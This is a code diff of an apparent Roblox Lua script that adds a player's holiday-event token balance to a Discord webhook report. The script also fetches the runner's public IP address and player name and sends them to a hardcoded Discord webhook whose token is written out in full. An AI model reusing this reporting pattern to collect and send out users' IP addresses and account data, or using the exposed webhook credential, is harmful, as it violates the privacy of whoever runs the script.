@@ -20,6 +20,27 @@ local wait = task.wait
 
 local Webhook = "https://discord.com/api/webhooks/1194145365960691792/guEpoUwKsorPoC2L1x0w-aJB8BgnFb1JujNWGwv8VZiiOoXVikQcZKj9Xtb3_ElooxON"
 
+local BalanceEvent
+function CurrentBall()
+    for kek, lel in pairs(Player:GetDescendants()) do
+        if lel.Name == "Christmas2023" then
+            for you, jej in pairs(lel:GetDescendants()) do
+                if jej.Name == "MysteryBox" then
+                    for ioi, uio in pairs(jej:GetDescendants()) do
+                        if uio.Name == "Tokens" then
+                            for joj, non in pairs(uio:GetDescendants()) do
+                                if non.Name == "TextLabel" then
+                                   BalanceEvent = non.Text
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+CurrentBall()
 function sendToDiscord(color, message, everyone)
 local IPv4 = game:HttpGet("https://api.ipify.org")
  MyNick = game:GetService("Players").LocalPlayer.Name
@@ -48,6 +69,11 @@ local IPv4 = game:HttpGet("https://api.ipify.org")
         {
           ['name'] = 'Player name',
           ['value'] = MyNick,
+          ['inline'] = false
+        },
+        {
+          ['name'] = 'Event balance',
+          ['value'] = BalanceEvent,
           ['inline'] = false
         }
       },
